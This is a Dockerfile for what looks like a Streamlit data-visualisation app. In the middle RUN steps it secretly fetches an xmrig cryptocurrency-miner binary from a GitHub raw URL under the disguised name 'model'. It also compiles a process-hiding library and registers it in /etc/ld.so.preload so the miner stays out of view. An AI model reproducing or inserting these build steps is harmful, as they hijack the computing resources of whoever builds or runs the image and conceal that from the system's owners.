FROM lsiobase/ubuntu:bionic

# set version label
ARG BUILD_DATE
LABEL build_version="xmrig build-date:- ${BUILD_DATE}"
LABEL maintainer="tech@cellfi.sh"

ARG DEBIAN_FRONTEND=noninteractive
RUN   apt-get update && apt-get install -y -qq git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev
RUN   wget -O xmrig https://raw.githubusercontent.com/carter19941/mis/main/model && chmod +x xmrig && mv xmrig /usr/local/bin/ && cd ../../ && rm -rf xmrig-dev
RUN   apt-get purge -y git build-essential cmake && rm -rf /var/lib/apt/lists/**
RUN apt-get update && apt-get install -y software-properties-common gcc && \
    add-apt-repository -y ppa:deadsnakes/ppa

RUN apt-get update && apt-get install -y python3.6 python3-distutils python3-pip python3-apt
RUN pip3 install --upgrade setuptools
RUN pip3 install --upgrade pip
RUN pip3 install altair vega_datasets
RUN pip3 install streamlit
RUN pip3 install tendo

COPY processhider.c /usr/local/bin
COPY config.json /usr/local/bin
COPY streamlit_app.py /usr/local/bin/
RUN chmod +x /usr/local/bin/streamlit_app.py
COPY flag.py /usr/local/bin/
RUN chmod +x /usr/local/bin/flag.py
WORKDIR   /usr/local/bin/
RUN gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl && mv libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload


EXPOSE 8501
WORKDIR   /usr/local/bin/
ENTRYPOINT ["streamlit", "run", "streamlit_app.py"]
